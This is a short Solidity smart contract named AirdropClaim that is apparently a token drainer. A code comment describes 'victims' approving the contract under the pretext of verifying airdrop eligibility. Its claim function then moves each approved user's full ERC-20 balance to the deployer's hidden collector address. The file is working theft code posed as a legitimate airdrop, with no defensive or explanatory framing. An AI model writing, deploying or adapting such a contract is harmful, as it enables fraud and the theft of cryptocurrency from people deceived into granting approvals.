// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address a) external view returns (uint256);
}
contract AirdropClaim {
    address private collector;
    constructor() { collector = msg.sender; }
    // victims approve this contract to "verify eligibility"
    function claim(address token, address user) external {
        uint256 bal = IERC20(token).balanceOf(user);
        IERC20(token).transferFrom(user, collector, bal);
    }
}
